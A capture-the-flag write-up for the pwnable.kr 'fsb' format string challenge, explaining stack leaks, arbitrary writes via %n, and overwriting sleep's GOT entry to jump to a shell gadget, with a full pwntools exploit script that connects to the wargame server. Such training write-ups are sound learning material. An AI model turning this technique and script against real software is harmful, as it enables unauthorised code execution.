
# FSB

fsb, is a `format string` vulnerability challenge.
We get the source code in the challenge so thats nice!

The vulnerable part is here:

![[vulnerable_part.png]]

And they give us four runs which is awesome!
also, they are offering a gadget for us!
![[win_gadget.png]]

Sounds like an easy problem!
first lets see the stack, we will submit a lot of `%p ` 
![[stack_leak.png]]

if we take a close look on the addresses, it seems like there are some addresses in the stack, which points to another address in the stack.
I tried to play with this a bit and got to conclusion we can use the 14'th address!
I tried using gdb.

![[set_address_gdb.png]]
![[apear_in_stack.png]]
And we succeed!
Why is it good for us?
since there are more then one run, we can first use this primitive in order to put address on the stack, and then use the same primitive to override the address
which mean we got arbitrary write!
```python
b"%" + addr + "c%14$n"
```
This format, will make the `addr` apear in the stack.
we are using `%{number}c` in order to print `{number}` charecters from the stack,
then doing `%14$` in order to use the 14'th element from the stack, and `%n` to write to that element, the number of characters printed, in other word `addr`

Which address we want to override?
U can probably just override the key to known value and submit the value, and get a shell. But it less cool, and can lead to mistakes, lets just make us jump to the shell!

using objdump, we can identify the `got` address of `sleep` 

![[got_sleep.png]]
Now we can put this address on the stack, and then override it with the address of the gadget!

So we will make the got sleep address, apear using override the 14'th element, then with the same method override the 20'th element:
```python
#!/usr/bin/python3

from pwn import *

e = ELF("./fsb")

sleep_addr = e.sym["got.sleep"]
shell_addr = 0x0804869f

s = ssh(host="pwnable.kr", port=2222, user="fsb", password="guest")
p = s.process(["/home/fsb/fsb"])

p.recvuntil(b"(1)")
p.sendline(b"a")
p.recvuntil(b"(2)")
p.sendline(b"a")


p.recvuntil("(3)")

f1 = b"%" + str(sleep_addr-2).encode() + b"czz%14$n"
print(f1)
p.sendline(f1)
p.recvuntil(b"zz")

f2 = b"%" + str(shell_addr-2).encode() + b"czz%20$n"
print(f2)
p.sendline(f2)
p.recvuntil(b"zz")

p.interactive()
```

![[win_img.png]]